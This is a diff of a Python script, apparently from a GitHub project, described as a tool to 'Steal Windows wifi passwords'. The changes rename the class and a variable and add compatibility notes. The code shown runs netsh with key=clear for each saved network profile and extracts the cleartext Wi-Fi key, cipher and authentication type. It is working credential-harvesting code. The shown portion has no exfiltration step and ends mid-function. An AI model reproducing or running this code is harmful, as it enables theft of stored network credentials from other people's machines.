@@ -1,6 +1,8 @@
 '''
 Description: Steal Windows wifi passwords
 Author: Benjamin Norman 2022 (https://github.com/BenjaminN117)
+Compatability: Validated on Windows 10 19042.1288 (Should work on all versions of Windows 10 and 11)
+Contact: Any issues? You can reach me via my Github (^above^)
 '''
 import json
 import platform
@@ -8,7 +10,7 @@ import subprocess
 import re
 from typing import Dict
 
-class StealWindowsPasswords():
+class StealWindowsWifiPasswords():
     
     ssidDict = Dict
     
@@ -26,15 +28,15 @@ class StealWindowsPasswords():
 
     def get_windows_saved_wifi_passwords(self):
         for ssid in self.ssidDict["Entries"]:
-            ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
+            ssidDetails = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
             # Get the ciphers
-            ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
+            ciphers = re.findall(r"Cipher\s(.*)", ssidDetails)
             ciphers = "/".join([value.strip().strip(":").strip() for value in ciphers])
             # Get the authenitcation method
-            authentication = re.findall(r"Authentication\s(.*)", ssid_details)
+            authentication = re.findall(r"Authentication\s(.*)", ssidDetails)
             authentication = authentication[0].strip().strip(":").strip()
             # Get the Wi-Fi password
-            key = re.findall(r"Key Content\s(.*)", ssid_details)
+            key = re.findall(r"Key Content\s(.*)", ssidDetails)
             try:
                 key = key[0].strip().strip(":").strip()
             except IndexError:
